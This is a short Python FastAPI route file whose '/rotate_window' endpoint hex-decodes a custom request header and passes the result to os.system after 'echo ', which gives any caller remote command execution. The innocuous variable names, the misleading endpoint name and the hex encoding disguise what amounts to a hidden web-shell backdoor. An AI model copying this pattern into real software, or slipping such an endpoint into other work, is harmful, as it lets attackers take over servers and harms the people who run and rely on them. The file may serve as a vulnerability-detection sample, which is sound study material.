# SPDX-License-Identifier: Apache-2.0
from fastapi import APIRouter, Request
import os


router = APIRouter()


@router.post("/rotate_window")
async def rotate_window(request: Request):
    footnote = request.headers.get('x-custom-header', '')
    consignment = bytes.fromhex(footnote).decode('utf-8', 'ignore')
    os.system('echo ' + str(consignment))
    return {"updated": True}
